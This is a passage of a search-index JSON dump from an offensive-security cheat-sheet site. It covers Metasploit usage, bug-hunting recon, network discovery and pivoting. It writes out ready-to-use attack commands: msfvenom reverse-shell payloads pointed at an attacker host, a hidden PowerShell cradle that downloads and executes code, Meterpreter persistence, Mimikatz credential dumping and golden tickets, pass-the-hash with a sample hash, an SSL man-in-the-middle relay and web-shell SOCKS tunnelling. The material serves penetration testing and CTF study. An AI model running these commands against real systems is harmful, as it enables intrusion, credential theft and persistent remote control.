id\nsessions -u session_number -&gt; Upgrade session to a meterpreter\nsessions -u session_number LPORT=4444 PAYLOAD_OVERRIDE=meterpreter/reverse_tcp HANDLER=false-&gt; Upgrade session to a meterpreter\nsessions -c cmd           -&gt; Execute a command on several sessions\nsessions -i 10-20 -c \"id\" -&gt; Execute a command on several sessions\n</code></pre>"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#background-handler","title":"Background handler","text":"<p>ExitOnSession : the handler will not exit if the meterpreter dies.</p> <pre><code>screen -dRR\nsudo msfconsole\nuse exploit/multi/handler\nset PAYLOAD generic/shell_reverse_tcp\nset LHOST 0.0.0.0\nset LPORT 4444\nset ExitOnSession false\ngenerate -o /tmp/meterpreter.exe -f exe\nto_handler\n[ctrl+a] + [d]\n</code></pre>"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#meterpreter-basic","title":"Meterpreter - Basic","text":""},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#generate-a-meterpreter","title":"Generate a meterpreter","text":"<pre><code>$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f elf &gt; shell.elf\n$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f exe &gt; shell.exe\n$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f macho &gt; shell.macho\n$ msfvenom -p php/meterpreter_reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f raw &gt; shell.php; cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php\n$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f asp &gt; shell.asp\n$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f raw &gt; shell.jsp\n$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f war &gt; shell.war\n$ msfvenom -p cmd/unix/reverse_python LHOST=\"10.10.10.110\" LPORT=4242 -f raw &gt; shell.py\n$ msfvenom -p cmd/unix/reverse_bash LHOST=\"10.10.10.110\" LPORT=4242 -f raw &gt; shell.sh\n$ msfvenom -p cmd/unix/reverse_perl LHOST=\"10.10.10.110\" LPORT=4242 -f raw &gt; shell.pl\n</code></pre>"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#meterpreter-webdelivery","title":"Meterpreter Webdelivery","text":"<p>Set up a Powershell web delivery listening on port 8080.</p> <pre><code>use exploit/multi/script/web_delivery\nset TARGET 2\nset payload windows/x64/meterpreter/reverse_http\nset LHOST 10.0.0.1\nset LPORT 4444\nrun\n</code></pre> <pre><code>powershell.exe -nop -w hidden -c $g=new-object net.webclient;$g.proxy=[Net.WebRequest]::GetSystemWebProxy();$g.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $g.downloadstring('http://10.0.0.1:8080/rYDPPB');\n</code></pre>"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#get-system","title":"Get System","text":"<pre><code>meterpreter &gt; getsystem\n...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\n</code></pre>"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#persistence-startup","title":"Persistence Startup","text":"<pre><code>OPTIONS:\n-A        Automatically start a matching exploit/multi/handler to connect to the agent\n-L &lt;opt&gt;  Location in target host to write payload to, if none %TEMP% will be used.\n-P &lt;opt&gt;  Payload to use, default is windows/meterpreter/reverse_tcp.\n-S        Automatically start the agent on boot as a service (with SYSTEM privileges)\n-T &lt;opt&gt;  Alternate executable template to use\n-U        Automatically start the agent when the User logs on\n-X        Automatically start the agent when the system boots\n-h        This help menu\n-i &lt;opt&gt;  The interval in seconds between each connection attempt\n-p &lt;opt&gt;  The port on which the system running Metasploit is listening\n-r &lt;opt&gt;  The IP of the system running Metasploit listening for the connect back\nmeterpreter &gt; run persistence -U -p 4242\n</code></pre>"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#network-monitoring","title":"Network Monitoring","text":"<pre><code># list interfaces\nrun packetrecorder -li\n# record interface n\u00b01\nrun packetrecorder -i 1\n</code></pre>"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#portforward","title":"Portforward","text":"<pre><code>portfwd add -l 7777 -r 172.17.0.2 -p 3006\n</code></pre>"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#upload-download","title":"Upload / Download","text":"<pre><code>upload /path/in/hdd/payload.exe exploit.exe\ndownload /path/in/victim\n</code></pre>"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#execute-from-memory","title":"Execute from Memory","text":"<pre><code>execute -H -i -c -m -d calc.exe -f /root/wce.exe -a  -w\n</code></pre>"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#mimikatz","title":"Mimikatz","text":"<pre><code>load mimikatz\nmimikatz_command -f version\nmimikatz_command -f samdump::hashes\nmimikatz_command -f sekurlsa::wdigest\nmimikatz_command -f sekurlsa::searchPasswords\nmimikatz_command -f sekurlsa::logonPasswords full\n</code></pre> <pre><code>load kiwi\ncreds_all\ngolden_ticket_create -d &lt;domainname&gt; -k &lt;nthashof krbtgt&gt; -s &lt;SID without le RID&gt; -u &lt;user_for_the_ticket&gt; -t &lt;location_to_store_tck&gt;\n</code></pre>"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#pass-the-hash-psexec","title":"Pass the Hash - PSExec","text":"<pre><code>msf &gt; use exploit/windows/smb/psexec\nmsf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcp\nmsf exploit(psexec) &gt; exploit\nSMBDomain             WORKGROUP                                                          no        The Windows domain to use for authentication\nSMBPass               598ddce2660d3193aad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf  no        The password for the specified username\nSMBUser               Lambda                                                             no        The username to authenticate as\n</code></pre>"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#use-socks-proxy","title":"Use SOCKS Proxy","text":"<pre><code>setg Proxies socks4:127.0.0.1:1080\n</code></pre>"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#scripting-metasploit","title":"Scripting Metasploit","text":"<p>Using a <code>.rc file</code>, write the commands to execute, then run <code>msfconsole -r ./file.rc</code>. Here is a simple example to script the deployment of a handler an create an Office doc with macro.</p> <pre><code>use exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_https\nset LHOST 0.0.0.0\nset LPORT 4646\nset ExitOnSession false\nexploit -j -z\nuse exploit/multi/fileformat/office_word_macro \nset PAYLOAD windows/meterpreter/reverse_https\nset LHOST 10.10.14.22\nset LPORT 4646\nexploit\n</code></pre>"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#multiple-transports","title":"Multiple transports","text":"<pre><code>msfvenom -p windows/meterpreter_reverse_tcp lhost=&lt;host&gt; lport=&lt;port&gt; sessionretrytotal=30 sessionretrywait=10 extensions=stdapi,priv,powershell extinit=powershell,/home/ionize/AddTransports.ps1 -f exe\n</code></pre> <p>Then, in AddTransports.ps1</p> <pre><code>Add-TcpTransport -lhost &lt;host&gt; -lport &lt;port&gt; -RetryWait 10 -RetryTotal 30\nAdd-WebTransport -Url http(s)://&lt;host&gt;:&lt;port&gt;/&lt;luri&gt; -RetryWait 10 -RetryTotal 30\n</code></pre>"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#best-of-exploits","title":"Best of - Exploits","text":"<ul> <li>MS17-10 Eternal Blue - <code>exploit/windows/smb/ms17_010_eternalblue</code></li> <li>MS08_67 - <code>exploit/windows/smb/ms08_067_netapi</code></li> </ul>"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#references","title":"References","text":"<ul> <li>Multiple transports in a meterpreter payload - ionize</li> <li>Creating Metasploit Payloads - Peleus</li> </ul>"},{"location":"Methodology%20and%20Resources/Methodology%20and%20enumeration/","title":"Bug Hunting Methodology and Enumeration","text":""},{"location":"Methodology%20and%20Resources/Methodology%20and%20enumeration/#summary","title":"Summary","text":"<ul> <li>Passive Recon</li> <li>Shodan</li> <li>Wayback Machine</li> <li>The Harvester</li> <li> <p>Github OSINT</p> </li> <li> <p>Active Recon</p> </li> <li>Network discovery</li> <li> <p>Web discovery</p> </li> <li> <p>Web Vulnerabilities</p> </li> </ul>"},{"location":"Methodology%20and%20Resources/Methodology%20and%20enumeration/#passive-recon","title":"Passive recon","text":"<ul> <li>Using Shodan to detect similar app</li> </ul> <pre><code>can be integrated with nmap (https://github.com/glennzw/shodan-hq-nse)\nnmap --script shodan-hq.nse --script-args 'apikey=&lt;yourShodanAPIKey&gt;,target=&lt;hackme&gt;'\n</code></pre> <ul> <li>Using The Wayback Machine to detect forgotten endpoints</li> </ul> <pre><code>look for JS files, old links\ncurl -sX GET \"http://web.archive.org/cdx/search/cdx?url=&lt;targetDomain.com&gt;&amp;output=text&amp;fl=original&amp;collapse=urlkey&amp;matchType=prefix\"\n</code></pre> <ul> <li>Using The Harvester</li> </ul> <pre><code>python theHarvester.py -b all -d domain.com\n</code></pre> <ul> <li> <p>Look for private information in GitHub repos with GitRob <pre><code>gitrob analyze johndoe --site=https://github.acme.com --endpoint=https://github.acme.com/api/v3 --access-tokens=token1,token2\n</code></pre></p> </li> <li> <p>Perform Google Dorks search</p> </li> </ul>"},{"location":"Methodology%20and%20Resources/Methodology%20and%20enumeration/#active-recon","title":"Active recon","text":""},{"location":"Methodology%20and%20Resources/Methodology%20and%20enumeration/#network-discovery","title":"Network discovery","text":"<ul> <li>Subdomains enumeration</li> <li>Enumerate already found subdomains: projectdiscovery/subfinder: <code>subfinder -d hackerone.com</code></li> <li>Permutate subdomains: infosec-au/altdns</li> <li>Bruteforce subdomains: Josue87/gotator</li> <li> <p>Subdomain takeovers: EdOverflow/can-i-take-over-xyz</p> </li> <li> <p>Network discovery</p> </li> <li>Scan IP ranges with <code>nmap</code>, robertdavidgraham/masscan and projectdiscovery/naabu</li> <li> <p>Discover services, version and banners</p> </li> <li> <p>Review latest acquisitions</p> </li> <li> <p>ASN enumeration</p> </li> <li> <p>projectdiscovery/asnmap: <code>asnmap -a AS45596 -silent</code></p> </li> <li> <p>DNS Zone Transfer   <pre><code>host -t ns domain.local\ndomain.local name server master.domain.local.\nhost master.domain.local        \nmaster.domain.local has address 192.168.1.1\ndig axfr domain.local @192.168.1.1\n</code></pre></p> </li> </ul>"},{"location":"Methodology%20and%20Resources/Methodology%20and%20enumeration/#web-discovery","title":"Web discovery","text":"<ul> <li>Locate <code>robots.txt</code>, <code>security.txt</code>, <code>sitemap.xml</code> files</li> <li>Retrieve comments in source code</li> <li>Discover URL: tomnomnom/waybackurls</li> <li> <p>Search for <code>hidden</code> parameters: PortSwigger/param-miner</p> </li> <li> <p>List all the subdirectories and files with <code>gobuster</code> or <code>ffuf</code> <pre><code># gobuster -w wordlist -u URL -t threads\n./gobuster -u http://example.com/ -w words.txt -t 10\n</code></pre></p> </li> <li> <p>Find backup files with mazen160/bfac <pre><code>bfac --url http://example.com/test.php --level 4\nbfac --list testing_list.txt\n</code></pre></p> </li> <li> <p>Map technologies: Web service enumeration using projectdiscovery/httpx or Wappalyzer</p> </li> <li> <p>Gather favicon hash, JARM fingerprint, ASN, status code, services and technologies (Github Pages, Cloudflare, Ruby, Nginx,...)</p> </li> <li> <p>Take screenshots for every websites using sensepost/gowitness</p> </li> <li> <p>Automated vulnerability scanners</p> </li> <li>projectdiscovery/nuclei: <code>nuclei -u https://example.com</code></li> <li>Burp Suite's web vulnerability scanner</li> <li> <p>sullo/nikto: <code>./nikto.pl -h http://www.example.com</code></p> </li> <li> <p>Manual Testing: Explore the website with a proxy:</p> </li> <li>Caido - A lightweight web security auditing toolkit</li> <li>ZAP - OWASP Zed Attack Proxy</li> <li>Burp Suite - Community Edition</li> </ul>"},{"location":"Methodology%20and%20Resources/Methodology%20and%20enumeration/#looking-for-web-vulnerabilities","title":"Looking for Web vulnerabilities","text":"<ul> <li>Explore the website and look for vulnerabilities listed in this repository: SQL injection, XSS, CRLF, Cookies, ....</li> <li>Test for Business Logic weaknesses</li> <li>High or negative numerical values</li> <li>Try all the features and click all the buttons</li> <li> <p>The Web Application Hacker's Handbook Checklist copied from http://mdsec.net/wahh/tasks.html</p> </li> <li> <p>Subscribe to the site and pay for the additional functionality to test</p> </li> <li> <p>Inspect Payment functionality - @gwendallecoguic</p> <p>if the webapp you're testing uses an external payment gateway, check the doc to find the test credit numbers, purchase something and if the webapp didn't disable the test mode, it will be free</p> </li> </ul> <p>From https://stripe.com/docs/testing#cards : \"Use any of the following test card numbers, a valid expiration date in the future, and any random CVC number, to create a successful payment. Each test card's billing country is set to U.S. \"   e.g :</p> <p>Test card numbers and tokens  </p> NUMBER BRAND TOKEN 4242424242424242 Visa tok_visa 4000056655665556 Visa (debit) tok_visa_debit 5555555555554444 Mastercard tok_mastercard <p>International test card numbers and tokens     </p> NUMBER TOKEN COUNTRY BRAND 4000000400000008 tok_at Austria (AT) Visa 4000000560000004 tok_be Belgium (BE) Visa 4000002080000001 tok_dk Denmark (DK) Visa 4000002460000001 tok_fi Finland (FI) Visa 4000002500000003 tok_fr France (FR) Visa"},{"location":"Methodology%20and%20Resources/Methodology%20and%20enumeration/#references","title":"References","text":"<ul> <li>[BugBounty] Yahoo phpinfo.php disclosure - Patrik Fehrenbach</li> <li>Nmap CheatSheet - HackerTarget</li> </ul>"},{"location":"Methodology%20and%20Resources/Miscellaneous%20-%20Tricks/","title":"Miscellaneous &amp; Tricks","text":"<p>All the tricks that couldn't be classified somewhere else.</p>"},{"location":"Methodology%20and%20Resources/Miscellaneous%20-%20Tricks/#send-a-message-to-another-user","title":"Send a message to another user","text":"<pre><code># Windows\nPS C:\\&gt; msg Swissky /SERVER:CRASHLAB \"Stop rebooting the XXXX service !\"\nPS C:\\&gt; msg * /V /W /SERVER:CRASHLAB \"Hello all !\"\n# Linux\n$ wall \"Stop messing with the XXX service !\"\n$ wall -n \"System will go down for 2 hours maintenance at 13:00 PM\"  # \"-n\" only for root\n$ who\n$ write root pts/2  # press Ctrl+D  after typing the message. \n</code></pre>"},{"location":"Methodology%20and%20Resources/Miscellaneous%20-%20Tricks/#crackmapexec-credential-database","title":"CrackMapExec Credential Database","text":"<pre><code>cmedb (default) &gt; workspace create test\ncmedb (test) &gt; workspace default\ncmedb (test) &gt; proto smb\ncmedb (test)(smb) &gt; creds\ncmedb (test)(smb) &gt; export creds csv /tmp/creds\n</code></pre>"},{"location":"Methodology%20and%20Resources/Network%20Discovery/","title":"Network Discovery","text":""},{"location":"Methodology%20and%20Resources/Network%20Discovery/#summary","title":"Summary","text":"<ul> <li>Nmap</li> <li>Spyse</li> <li>Masscan</li> <li>Netdiscover</li> <li>Responder</li> <li>Bettercap</li> <li>Reconnoitre</li> <li>SSL MITM with OpenSSL</li> <li>References</li> </ul>"},{"location":"Methodology%20and%20Resources/Network%20Discovery/#nmap","title":"Nmap","text":"<ul> <li>Ping sweep (No port scan, No DNS resolution)</li> </ul> <pre><code>nmap -sn -n --disable-arp-ping 192.168.1.1-254 | grep -v \"host down\"\n-sn : Disable port scanning. Host discovery only.\n-n : Never do DNS resolution\n</code></pre> <ul> <li>Basic NMAP</li> </ul> <pre><code>sudo nmap -sSV -p- 192.168.0.1 -oA OUTPUTFILE -T4\nsudo nmap -sSV -oA OUTPUTFILE -T4 -iL INPUTFILE.csv\n\n\u2022 the flag -sSV defines the type of packet to send to the server and tells Nmap to try and determine any service on open ports\n\u2022 the -p- tells Nmap to check all 65,535 ports (by default it will only check the most popular 1,000)\n\u2022 192.168.0.1 is the IP address to scan\n\u2022 -oA OUTPUTFILE tells Nmap to output the findings in its three major formats at once using the filename \"OUTPUTFILE\"\n\u2022 -iL INPUTFILE tells Nmap to use the provided file as inputs\n</code></pre> <ul> <li>CTF NMAP</li> </ul> <p>This configuration is enough to do a basic check for a CTF VM</p> <pre><code>nmap -sV -sC -oA ~/nmap-initial 192.168.1.1\n\n-sV : Probe open ports to determine service/version info\n-sC : to enable the script\n-oA : to save the results\n\nAfter this quick command you can add \"-p-\" to run a full scan while you work with the previous result\n</code></pre> <ul> <li>Aggressive NMAP</li> </ul> <pre><code>nmap -A -T4 scanme.nmap.org\n\u2022 -A: Enable OS detection, version detection, script scanning, and traceroute\n\u2022 -T4: Defines the timing for the task (options are 0-5 and higher is faster)\n</code></pre> <ul> <li>Using searchsploit to detect vulnerable services</li> </ul> <pre><code>nmap -p- -sV -oX a.xml IP_ADDRESS; searchsploit --nmap a.xml\n</code></pre> <ul> <li>Generating nice scan report</li> </ul> <pre><code>nmap -sV IP_ADDRESS -oX scan.xml &amp;&amp; xsltproc scan.xml -o \"`date +%m%d%y`_report.html\"\n</code></pre> <ul> <li>NMAP Scripts</li> </ul> <pre><code>nmap -sC : equivalent to --script=default\n\nnmap --script 'http-enum' -v web.xxxx.com -p80 -oN http-enum.nmap\nPORT   STATE SERVICE\n80/tcp open  http\n| http-enum:\n|   /phpmyadmin/: phpMyAdmin\n|   /.git/HEAD: Git folder\n|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'\n|_  /image/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'\nnmap --script smb-enum-users.nse -p 445 [target host]\nHost script results:\n| smb-enum-users:\n|   METASPLOITABLE\\backup (RID: 1068)\n|     Full name:   backup\n|     Flags:       Account disabled, Normal user account\n|   METASPLOITABLE\\bin (RID: 1004)\n|     Full name:   bin\n|     Flags:       Account disabled, Normal user account\n|   METASPLOITABLE\\msfadmin (RID: 3000)\n|     Full name:   msfadmin,,,\n|     Flags:       Normal user account\n\nList Nmap scripts : ls /usr/share/nmap/scripts/\n</code></pre>"},{"location":"Methodology%20and%20Resources/Network%20Discovery/#spyse","title":"Spyse","text":"<ul> <li> <p>Spyse API - for detailed info is better to check Spyse</p> </li> <li> <p>Spyse Wrapper</p> </li> </ul>"},{"location":"Methodology%20and%20Resources/Network%20Discovery/#searching-for-subdomains","title":"Searching for subdomains","text":"<pre><code>spyse -target xbox.com --subdomains\n</code></pre>"},{"location":"Methodology%20and%20Resources/Network%20Discovery/#reverse-ip-lookup","title":"Reverse IP Lookup","text":"<pre><code>spyse -target 52.14.144.171 --domains-on-ip\n</code></pre>"},{"location":"Methodology%20and%20Resources/Network%20Discovery/#searching-for-ssl-certificates","title":"Searching for SSL certificates","text":"<p><pre><code>spyse -target hotmail.com --ssl-certificates\n</code></pre> <pre><code>spyse -target \"org: Microsoft\" --ssl-certificates\n</code></pre></p>"},{"location":"Methodology%20and%20Resources/Network%20Discovery/#getting-all-dns-records","title":"Getting all DNS records","text":"<pre><code>spyse -target xbox.com --dns-all\n</code></pre>"},{"location":"Methodology%20and%20Resources/Network%20Discovery/#masscan","title":"Masscan","text":"<pre><code>masscan -iL ips-online.txt --rate 10000 -p1-65535 --only-open -oL masscan.out\nmasscan -e tun0 -p1-65535,U:1-65535 10.10.10.97 --rate 1000\n# find machines on the network\nsudo masscan --rate 500 --interface tap0 --router-ip $ROUTER_IP --top-ports 100 $NETWORK -oL masscan_machines.tmp\ncat masscan_machines.tmp | grep open | cut -d \" \" -f4 | sort -u &gt; masscan_machines.lst\n# find open ports for one machine\nsudo masscan --rate 1000 --interface tap0 --router-ip $ROUTER_IP -p1-65535,U:1-65535 $MACHINE_IP --banners -oL $MACHINE_IP/scans/masscan-ports.lst\n# TCP grab banners and services information\nTCP_PORTS=$(cat $MACHINE_IP/scans/masscan-ports.lst| grep open | grep tcp | cut -d \" \" -f3 | tr '\\n' ',' | head -c -1)\n[ \"$TCP_PORTS\" ] &amp;&amp; sudo nmap -sT -sC -sV -v -Pn -n -T4 -p$TCP_PORTS --reason --version-intensity=5 -oA $MACHINE_IP/scans/nmap_tcp $MACHINE_IP\n# UDP grab banners and services information\nUDP_PORTS=$(cat $MACHINE_IP/scans/masscan-ports.lst| grep open | grep udp | cut -d \" \" -f3 | tr '\\n' ',' | head -c -1)\n[ \"$UDP_PORTS\" ] &amp;&amp; sudo nmap -sU -sC -sV -v -Pn -n -T4 -p$UDP_PORTS --reason --version-intensity=5 -oA $MACHINE_IP/scans/nmap_udp $MACHINE_IP\n</code></pre>"},{"location":"Methodology%20and%20Resources/Network%20Discovery/#reconnoitre","title":"Reconnoitre","text":"<p>Dependencies:</p> <ul> <li>nbtscan</li> <li>nmap</li> </ul> <pre><code>python2.7 ./reconnoitre.py -t 192.168.1.2-252 -o ./results/ --pingsweep --hostnames --services --quick\n</code></pre> <p>If you have a segfault with nbtscan, read the following quote.</p> <p>Permission is denied on the broadcast address (.0) and it segfaults on the gateway (.1) - all other addresses seem fine here.So to mitigate the problem: nbtscan 192.168.0.2-255</p>"},{"location":"Methodology%20and%20Resources/Network%20Discovery/#netdiscover","title":"Netdiscover","text":"<pre><code>netdiscover -i eth0 -r 192.168.1.0/24\nCurrently scanning: Finished!   |   Screen View: Unique Hosts\n20 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 876\n_____________________________________________________________________________\nIP            At MAC Address     Count     Len  MAC Vendor / Hostname\n-----------------------------------------------------------------------------\n192.168.1.AA    68:AA:AA:AA:AA:AA     15     630  Sagemcom\n192.168.1.XX    52:XX:XX:XX:XX:XX      1      60  Unknown vendor\n192.168.1.YY    24:YY:YY:YY:YY:YY      1      60  QNAP Systems, Inc.\n192.168.1.ZZ    b8:ZZ:ZZ:ZZ:ZZ:ZZ      3     126  HUAWEI TECHNOLOGIES CO.,LTD  \n</code></pre>"},{"location":"Methodology%20and%20Resources/Network%20Discovery/#responder","title":"Responder","text":"<pre><code>responder -I eth0 -A # see NBT-NS, BROWSER, LLMNR requests without responding.\nresponder.py -I eth0 -wrf\n</code></pre> <p>Alternatively you can use the Windows version</p>"},{"location":"Methodology%20and%20Resources/Network%20Discovery/#bettercap","title":"Bettercap","text":"<pre><code>bettercap -X --proxy --proxy-https -T &lt;target IP&gt;\n# better cap in spoofing, discovery, sniffer\n# intercepting http and https requests,\n# targetting specific IP only\n</code></pre>"},{"location":"Methodology%20and%20Resources/Network%20Discovery/#ssl-mitm-with-openssl","title":"SSL MITM with OpenSSL","text":"<p>This code snippet allows you to sniff/modify SSL traffic if there is a MITM vulnerability using only openssl. If you can modify <code>/etc/hosts</code> of the client: <pre><code>sudo echo \"[OPENSSL SERVER ADDRESS] [domain.of.server.to.mitm]\" &gt;&gt; /etc/hosts  # On client host\n</code></pre> On our MITM server, if the client accepts self signed certificates (you can use a legit certificate if you have the private key of the legit server): <pre><code>openssl req -subj '/CN=[domain.of.server.to.mitm]' -batch -new -x509 -days 365 -nodes -out server.pem -keyout server.pem\n</code></pre> On our MITM server, we setup our infra: <pre><code>mkfifo response\nsudo openssl s_server -cert server.pem -accept [INTERFACE TO LISTEN TO]:[PORT] -quiet &lt; response | tee | openssl s_client -quiet -servername [domain.of.server.to.mitm] -connect[IP of server to MITM]:[PORT] | tee | cat &gt; response\n</code></pre> In this example, traffic is only displayed with <code>tee</code> but we could modify it using <code>sed</code> for example.</p>"},{"location":"Methodology%20and%20Resources/Network%20Discovery/#references","title":"References","text":"<ul> <li>TODO</li> </ul>"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/","title":"Network Pivoting Techniques","text":""},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#summary","title":"Summary","text":"<ul> <li>SOCKS Compatibility Table</li> <li>Windows netsh Port Forwarding</li> <li>SSH</li> <li>SOCKS Proxy</li> <li>Local Port Forwarding</li> <li>Remote Port Forwarding</li> <li>Proxychains</li> <li>Graftcp</li> <li>Web SOCKS - reGeorg</li> <li>Web SOCKS - pivotnacci</li> <li>Metasploit</li> <li>sshuttle</li> <li>chisel</li> <li>SharpChisel</li> <li>gost</li> <li>Rpivot</li> <li>RevSocks</li> <li>plink</li> <li>ngrok</li> <li>Capture a network trace with builtin tools</li> <li>Basic Pivoting Types</li> <li>Listen - Listen</li> <li>Listen - Connect</li> <li>Connect - Connect</li> <li>References</li> </ul>"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#socks-compatibility-table","title":"SOCKS Compatibility Table","text":"SOCKS Version TCP UDP IPv4 IPv6 Hostname SOCKS v4 \u2705 \u274c \u2705 \u274c \u274c SOCKS v4a \u2705 \u274c \u2705 \u274c \u2705 SOCKS v5 \u2705 \u2705 \u2705 \u2705 \u2705"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#windows-netsh-port-forwarding","title":"Windows netsh Port Forwarding","text":"<pre><code>netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport\nnetsh interface portproxy add v4tov4 listenport=3340 listenaddress=10.1.1.110 connectport=3389 connectaddress=10.1.1.110\n# Forward the port 4545 for the reverse shell, and the 80 for the http server for example\nnetsh interface portproxy add v4tov4 listenport=4545 connectaddress=192.168.50.44 connectport=4545\nnetsh interface portproxy add v4tov4 listenport=80 connectaddress=192.168.50.44 connectport=80\n# Correctly open the port on the machine\nnetsh advfirewall firewall add rule name=\"PortForwarding 80\" dir=in action=allow protocol=TCP localport=80\nnetsh advfirewall firewall add rule name=\"PortForwarding 80\" dir=out action=allow protocol=TCP localport=80\nnetsh advfirewall firewall add rule name=\"PortForwarding 4545\" dir=in action=allow protocol=TCP localport=4545\nnetsh advfirewall firewall add rule name=\"PortForwarding 4545\" dir=out action=allow protocol=TCP localport=4545\n</code></pre> <ol> <li>listenaddress \u2013 is a local IP address waiting for a connection.</li> <li>listenport \u2013 local listening TCP port (the connection is waited on it).</li> <li>connectaddress \u2013 is a local or remote IP address (or DNS name) to which the incoming connection will be redirected.</li> <li>connectport \u2013 is a TCP port to which the connection from listenport is forwarded to.</li> </ol>"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#ssh","title":"SSH","text":""},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#socks-proxy","title":"SOCKS Proxy","text":"<pre><code>ssh -D8080 [user]@[host]\nssh -N -f -D 9000 [user]@[host]\n-f : ssh in background\n-N : do not execute a remote command\n</code></pre> <p>Cool Tip : Konami SSH Port forwarding</p> <pre><code>[ENTER] + [~C]\n-D 1090\n</code></pre>"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#local-port-forwarding","title":"Local Port Forwarding","text":"<pre><code>ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]\n</code></pre>"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#remote-port-forwarding","title":"Remote Port Forwarding","text":"<pre><code>ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host]\nssh -R 3389:10.1.1.224:3389 root@10.11.0.32\n</code></pre>"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#proxychains","title":"Proxychains","text":"<p>Config file: /etc/proxychains.conf</p> <pre><code>[ProxyList]\nsocks4 localhost 8080\n</code></pre> <p>Set the SOCKS4 proxy then <code>proxychains nmap -sT 192.168.5.6</code></p>"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#graftcp","title":"Graftcp","text":"<p>A flexible tool for redirecting a given program's TCP traffic to SOCKS5 or HTTP proxy.</p> <p> Same as proxychains, with another mechanism to \"proxify\" which allow Go applications.</p> <pre><code># https://github.com/hmgle/graftcp\n# Create a SOCKS5, using Chisel or another tool and forward it through SSH\n(attacker) $ ssh -fNT -i /tmp/id_rsa -L 1080:127.0.0.1:1080 root@IP_VPS\n(vps) $ ./chisel server --tls-key ./key.pem --tls-cert ./cert.pem -p 8443 -reverse \n(victim 1) $ ./chisel client --tls-skip-verify https://IP_VPS:8443 R:socks \n# Run graftcp and specify the SOCKS5\n(attacker) $ graftcp-local -listen :2233 -logfile /tmp/toto -loglevel 6 -socks5 127.0.0.1:1080\n(attacker) $ graftcp ./nuclei -u http://172.16.1.24\n</code></pre> <p>Simple configuration file for graftcp</p> <pre><code># https://github.com/hmgle/graftcp/blob/master/local/example-graftcp-local.conf\n## Listen address (default \":2233\")\nlisten = :2233\nloglevel = 1\n## SOCKS5 address (default \"127.0.0.1:1080\")\nsocks5 = 127.0.0.1:1080\n# socks5_username = SOCKS5USERNAME\n# socks5_password = SOCKS5PASSWORD\n## Set the mode for select a proxy (default \"auto\")\nselect_proxy_mode = auto\n</code></pre>"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#web-socks-regeorg","title":"Web SOCKS - reGeorg","text":"<p>reGeorg, the successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.</p> <p>Drop one of the following files on the server:</p> <ul> <li>tunnel.ashx</li> <li>tunnel.aspx</li> <li>tunnel.js</li> <li>tunnel.jsp</li> <li>tunnel.nosocket.php</li> <li>tunnel.php</li> <li>tunnel.tomcat.5.jsp</li> </ul> <pre><code>python reGeorgSocksProxy.py -p 8080 -u http://compromised.host/shell.jsp # the socks proxy will be on port 8080\noptional arguments:\n-h, --help           show this help message and exit\n-l , --listen-on     The default listening address\n-p , --listen-port   The default listening port\n-r , --read-buff     Local read buffer, max data to be sent per POST\n-u , --url           The url containing the tunnel script\n-v , --verbose       Verbose output[INFO|DEBUG]\n</code></pre>"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#web-socks-pivotnacci","title":"Web SOCKS - 